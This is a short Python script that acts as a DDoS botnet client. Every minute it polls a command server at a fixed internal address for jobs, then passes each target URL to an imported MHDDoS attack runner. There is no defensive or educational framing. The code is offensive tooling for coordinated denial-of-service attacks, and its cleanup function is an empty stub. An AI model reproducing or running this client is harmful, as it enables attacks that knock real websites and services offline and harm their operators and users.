import requests
from mhddos import runner

base_url = "http://10.0.0.7:5000"  # Replace "your_base_url" with the actual base URL

global target
target = {}


def stop():
    # Add logic to stop the MHDDoS job or perform any necessary cleanup
    print("Stopping the current job")

def ping():
    # Run this function every 1 minute to check for new jobs
    global target
    response = requests.get(f"{base_url}/ping/").json()
    
    if response["prioritize"]:
        target = get_target()
        stop()
        work(target)
    else:
        # If nothing to prioritize, continue working on the current target
        work(target)

def get_target():
    # Fetch the job details from the server
    target = requests.get(f"{base_url}/get_job/").json()
    return target

def work(target):
    print(target)
    # Perform the specified job based on job_type
    if target["job_type"] == "DDoS":
        runner.run(target["url"])
    # Add additional conditions for other job types if needed

# Add a loop to run the ping function every 1 minute
if __name__ == "__main__":
    import time
    get_target()    
    while True:
        ping()
        time.sleep(60)  # Sleep for 1 minute before the next iteration
